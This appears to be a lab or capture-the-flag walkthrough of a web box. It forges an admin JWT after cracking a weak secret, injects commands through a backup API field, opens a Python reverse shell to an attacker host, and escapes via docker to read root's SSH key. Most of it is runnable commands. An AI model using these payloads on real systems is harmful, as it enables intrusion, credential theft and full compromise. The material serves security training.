Web app uses JWT tokens, weak secret allows privilege escalation.

### Initial Recon
```
# Web app at http://10.10.10.70
# API endpoint at /api/v1/users
curl http://10.10.10.70/api/v1/users
# {"message":"Unauthorized"}

# Register account
curl -X POST http://10.10.10.70/api/v1/register -d '{"username":"test","password":"test"}'
# {"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJyb2xlIjoidXNlciIsImlhdCI6MTY5NzAwMDAwMH0.signature"}
```

#### Analyze JWT
```
# Decode JWT (no secret needed for decode)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJyb2xlIjoidXNlciIsImlhdCI6MTY5NzAwMDAwMH0" | base64 -d
# {"username":"test","role":"user","iat":1697000000}

# Try to crack secret
hashcat -m 16500 -a 0 jwt.txt rockyou.txt
# Secret found: "secret123"

# Modify JWT with new role
# Create new payload
echo -n '{"username":"test","role":"admin","iat":1697000000}' | base64
# eyJ1c2VybmFtZSI6InRlc3QiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2OTcwMDAwMDB9

# Sign with secret
echo -n "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2OTcwMDAwMDB9" | openssl dgst -sha256 -hmac "secret123" -binary | base64
# signature

# Use new token
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2OTcwMDAwMDB9.signature" http://10.10.10.70/api/v1/admin
# {"users":["admin","test","backup_user"]}
```

#### Command Injection via API
```
# API endpoint for backups
curl -H "Authorization: Bearer [ADMIN_TOKEN]" -X POST http://10.10.10.70/api/v1/backup -d '{"file":"test.txt"}'
# {"status":"backup created"}

# Test command injection
curl -H "Authorization: Bearer [ADMIN_TOKEN]" -X POST http://10.10.10.70/api/v1/backup -d '{"file":"test.txt; id"}'
# {"status":"backup created", "output":"uid=33(www-data) gid=33(www-data) groups=33(www-data)"}

# Get reverse shell
curl -H "Authorization: Bearer [ADMIN_TOKEN]" -X POST http://10.10.10.70/api/v1/backup -d "{\"file\":\"test.txt; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\\\"10.10.14.5\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])'\"}"
```

#### Privilege Escalation via Docker
```
# Check docker
groups
# www-data docker

# List containers
docker ps
# CONTAINER ID   IMAGE     COMMAND   STATUS
# abc123def456   ubuntu    bash      Up 2 days

# Mount host filesystem
docker run -it -v /:/host ubuntu:latest /bin/bash

# In container, access host
cat /host/root/.ssh/id_rsa

# SSH as root
ssh -i root_key root@10.10.10.70
# root access!
```

